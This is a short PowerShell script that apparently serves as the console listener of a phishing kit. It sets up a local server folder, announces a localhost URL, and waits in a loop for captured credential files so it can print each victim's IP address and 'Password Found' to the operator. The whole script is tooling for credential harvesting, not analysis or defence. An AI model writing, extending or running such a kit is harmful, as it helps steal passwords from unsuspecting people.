function depend{

    if (-not(Test-Path ".server")) {
        mkdir .server
    }

    if (Test-Path -Path ".server\pass.txt"){
        Remove-Item -Force ".server\pass.txt"
    }

    if (Test-Path -Path ".server\ip.txt"){
        Remove-Item -Force ".server\ip.txt"
    }

}

function check_pass{

    if (Test-Path -Path ".server\pass.txt"){
        $ip = (Get-Content -Path .\.server\ip.txt)
        $pass = (Get-Content -Path .\.server\pass.txt)
        Write-Host("`nIP Address: $ip")
        Write-Host("Password Found: $pass`n")
        setup
    }
    else{
        Start-Sleep 1
        check_pass
    }

}

function setup{

    depend
    Write-Host("Waiting for Credentials...!!!")
    check_pass

}

Write-Host("`nURL: http://localhost:8888")
setup

